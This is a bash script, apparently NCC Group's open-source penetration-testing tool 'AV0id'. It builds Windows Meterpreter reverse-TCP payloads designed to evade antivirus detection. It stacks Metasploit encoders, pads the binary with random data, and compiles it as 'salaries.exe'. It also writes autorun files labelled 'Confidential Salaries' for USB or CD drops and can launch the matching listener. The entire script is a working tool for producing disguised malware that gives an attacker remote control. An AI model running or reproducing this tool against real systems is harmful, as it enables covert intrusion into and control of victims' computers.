#!/usr/bin/env bash

#######################################################################################
#  AV0id - Metapsloit Payload Anti-Virus Avasion                                      #
#                                                                                     #
   VERSION="1.5"
#######################################################################################
#  Daniel Compton                                                                     #
#                                                                                     #
#  www.commonexploits.com                                                             #
#                                                                                     #
#  info@commexploits.com                                                              #
#                                                                                     #
#  Twitter = @commonexploits                                                          #
#                                                                                     #
#  05/2013                                                                            #
#######################################################################################
#  Released as open source by NCC Group Plc - http://www.nccgroup.com/                #
#                                                                                     #
#  Developed by Daniel Compton, daniel dot compton at nccgroup dot com                #
#                                                                                     #
#  https://github.com/nccgroup/metasploitavevasion                                    #
#                                                                                     #
#  Released under AGPL see LICENSE for more information                               #
#######################################################################################
#  Tested on Bactrack 5, Kali and ArchAssault                                         #
#                                                                                     #
#  Credit to other A.V. scripts & research by Astr0baby, Vanish3r & Hasan (inf0g33k)  #
#######################################################################################


#######################################################################################
#  Settings                                                                           #
#######################################################################################
OUTPUTNAME="salaries.exe" # The payload exe created name
MSFPAYLOAD=`type -P msfpayload` # Path to the msfpayload script
MSFENCODE=`type -P msfencode` # Path to the msfencode script
MSFCLI=`type -P msfcli` # Path to the msfcli script

# mingw32 gcc in system, likely: i586-mingw32msvc-gcc 'or' i686-w64-mingw32-gcc
MINGW32="i686-w64-mingw32-gcc" 


#######################################################################################
#  Functions                                                                          #
#######################################################################################
spinlong ()
{
    # spinner for metasploit generator
    bar=$(for i in `seq 1 $(expr $(tput cols) - 2)`; do echo -n "+"; done)
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.1
    done
    printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:$((100*barlength / 100))}"
}

spinlong2 ()
{
    # spinner for random seed generator
    bar=$(for i in `seq 1 $(expr $(tput cols) - 2)`; do [[ "`cat /dev/urandom | tr -dc '0-9' | fold -w 3 | head -n 1 | sed 's/^00//g;s/^0//g;s/^$/0/g'`" -gt 500 ]] && echo -n 0 || echo -n 1; done)
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.05
    done
    printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:$((100*barlength / 100))}"
}

header ()
{
    clear
    echo -e -n "\n\e[00;32m"; for i in `seq 1 $(tput cols)`; do echo -n "#"; done; echo -e -n "\e[00m\n\n"
    [[ $(tput cols) -gt 60 ]] && for i in `seq 1 $(expr $(expr $(tput cols) - 60) / 2)`; do echo -n " "; done
    echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m -- Metasploit Shell A.V. Avoider Version $VERSION ***\n"
    echo -e -n "\e[00;32m"; for i in `seq 1 $(tput cols)`; do echo -n "#"; done; echo -e -n "\e[00m\n\n"
}


#######################################################################################
#  Script                                                                             #
#######################################################################################
header
# check for gcc compiler
type -P $MINGW32 >/dev/null 2>&1
if [ ! $? -eq 0 ]; then
    echo -e "\n\e[01;31m[!]\e[00m Unable to find the required gcc program, install the package that provides ${MINGW32} and try again"
    echo -e "\e[01;31m[!]\e[00m\t*NOTE: If this doesn't work and you have mingw32 gcc installed, you may need to set the MINGW32 variable in $0 to the location of the binary\n"
    exit 1
fi

# check for metasploit
if [[ "$MSFPAYLOAD" = "" || "$MSFENCODE" = "" || "$MSFCLI" = "" ]]; then
    echo -e "\n\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
    echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options\n"
    exit 1
fi

# check for pdf icon files and create them if they don't already exist
[[ -f icons/icon.res ]] && [[ -f icons/autorun.ico ]]
if [ ! $? -eq 0 ]; then
    echo -e "\n\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and download these now\n"
    install -d icons
    cd icons >/dev/null 2>&1
    echo -e -n "\n\e[01;32m[-]\e[00m Attempting to download 2 files... "
    wget http://www.commonexploits.com/tools/avoid/icon.res >/dev/null 2>&1 && wget http://www.commonexploits.com/tools/avoid/autorun.ico >/dev/null 2>&1 && echo -e "\e[01;32m[+]\e[00m Success, icon files downloaded\n" || echo -e "\e[01;31m[!]\e[00m Unable to download the icon files, script will continue but you will not have the masked PDF exe or autorun icon\n"
fi

# random msfencode encoding iterations
ITER=`shuf -i 10-20 -n 1` #ITER=`seq 5 10 |sort -R |sort -R | head -1`
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
echo -e "\e[01;31m[?]\e[00m Choose how to select an address for the Metasploit listenter to run:"
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -e " 1. Automatic: Use the first non-loopback ipv4 address on the system\n"
echo -e " 2. Manual: Specify the system address you would like to listen on"
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo

header
if [ "$INTEXT" = "1" ]; then
    DEVADDR=$(ip addr | sed 's/^\ *link.*//g;s/^\ *valid.*//g;s/^\ *inet//g;s/^6.*/^/g;s/:\ <.*//g;s/\/[0-9]*.*//g;s/^[0-9]*:\ /\$/g' | sed ':a;N;$!ba;s/\n/\^/g;s/\ *//g;s/127\.0\.0\.1//g' | grep --color=never -o -e "\$[^\^]*\^\^[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | head -n 1)
    IPINT=$(echo $DEVADDR | sed 's/^\$//g;s/\^.*//g')
    IP=$(echo $DEVADDR | sed 's/^[^\^]*\^*//g;')
    echo -e "\e[01;32m[-]\e[00m Automatic selection chosen\n\n    The listener will be launched on...\n\tInterface: \e[01;32m${IPINT}\e[00m\n\tAddress: \e[01;32m${IP}\e[00m\n"
    echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?\n    Hint: If on the internet, try port 53 if restricted"
    echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo
elif [ "$INTEXT" = "2" ]; then
    echo -e "\e[01;32m[-]\e[00m Alternative system selected\n"
    echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
    echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
    echo -ne "\e[01;32m>\e[00m "
    read IP
    echo -e -n "\n\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?\n    Hint: If on the internet, try port 53 if restricted"
    echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
    echo -ne "\e[01;32m>\e[00m "
    read PORT
    echo
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again\n"
    exit 1
fi

header
echo -e "\n\e[02;32m[-]\e[00m Generating Metasploit payload, please wait..."
spinlong

# payload creater
$MSFPAYLOAD windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" EXITFUNC=thread R | $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null

# menu
header
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file?"
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -e " 1. Normal - about 400K payoad  - fast compile - 13/46 A.V. products detected as malicious\n"
echo -e " 2. Stealth - about 1-2 MB payload - fast compile - 12/46 A.V. products detected as malicious\n"
echo -e " 3. Super Stealth - about 10-20MB payload - fast compile - 11/46 A.V. detected as malicious\n"
echo -e " 4. Insane Stealth - about 50MB payload - slower compile - 10/46 A.V. detected as malicious\n"
echo -e " 5. Desperate Stealth - about 100MB payload - slower compile - Not tested with A.V."
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -ne "\e[01;32m>\e[00m "
read LEVEL
echo

header
if [ "$LEVEL" = "1" ]; then
    echo -e "\n\e[01;32m[-]\e[00m Normal selected, please wait a few seconds\n"
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait\n"
    spinlong2
    SEED=$(shuf -i 100000-500000 -n 1)
elif [ "$LEVEL" = "2" ]; then
    echo -e "\n\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds\n"
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait\n"
    spinlong2
    SEED=$(shuf -i 1000000-5000000 -n 1)
elif [ "$LEVEL" = "3" ]; then
    echo -e "\n\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds\n"
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait\n"
    spinlong2
    SEED=$(shuf -i 8000000-12000000 -n 1)
elif [ "$LEVEL" = "4" ]; then
    echo -e "\n\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes\n"
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait\n"
    spinlong2
    SEED=$(shuf -i 40000000-60000000 -n 1)
elif [ "$LEVEL" = "5" ]; then
    echo -e "\n\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes\n"
    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait\n"
    spinlong2
    SEED=$(shuf -i 100000000-200000000 -n 1)
else
    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting\n"
    exit 1
fi

# build the c file ready for compile
echo
echo '#include <stdio.h>' >> build.c
echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo ';' >> build.c
echo 'char payload[] =' >> build.c
cat msf.c |grep -v "unsigned" >> build.c
echo 'char comment[512] = "";' >> build.c
echo 'int main(int argc, char **argv) {' >> build.c
echo '	(*(void (*)()) payload)();' >> build.c
echo '	return(0);' >> build.c
echo '}' >> build.c

# gcc compile the exploit
[[ -f icons/icon.res ]] \
    && $MINGW32 -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME" \
    || $MINGW32 -Wall -mwindows build.c -o "$OUTPUTNAME"

# check if file built correctly
LOCATED=`pwd`
[[ -e "$OUTPUTNAME" ]] \
    && echo -e "\n\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m" \
    || (echo -e "\n\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting\n"; exit 1)

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label=Confidential Salaries" >> autorun/autorun.inf
echo -e "\n\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB\n"

# clean up temp files
rm build.c >/dev/null 2>&1
rm random >/dev/null 2>&1
rm msf.c >/dev/null 2>&1

header
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want the listener to be loaded immediately?"
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -e " 1. Yes, display the command to start the listener and run it now\n"
echo -e " 2. No, display the command to start the listener exit"
echo -e -n "\e[1;31m"; for i in `seq 1 $(tput cols)`; do echo -n "-"; done; echo -e -n "\e[00m\n"
echo -ne "\e[01;32m>\e[00m "
read INTEXT
echo

header
# display the command to run the listener
echo -e -n "\e[01;32m"; for i in `seq 1 $(tput cols)`; do echo -n "+"; done; echo -e -n "\e[00m\n"
echo -e "\e[01;32m[-]\e[00m Run the following command to manually start the listener at a later date:"
echo -e "\n  ${MSFCLI} \\\\\n\texploit/multi/handler \\\\\n\tPAYLOAD=windows/meterpreter/reverse_tcp \\\\\n\tLHOST=\"$IP\" \\\\\n\tLPORT=\"$PORT\" \\\\\n\tE"
echo -e -n "\e[01;32m"; for i in `seq 1 $(tput cols)`; do echo -n "+"; done; echo -e -n "\e[00m\n\n"

# run the command if the user chose to load the listener
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m${IP}:${PORT}\e[00m, please wait...\n"
    $MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
fi
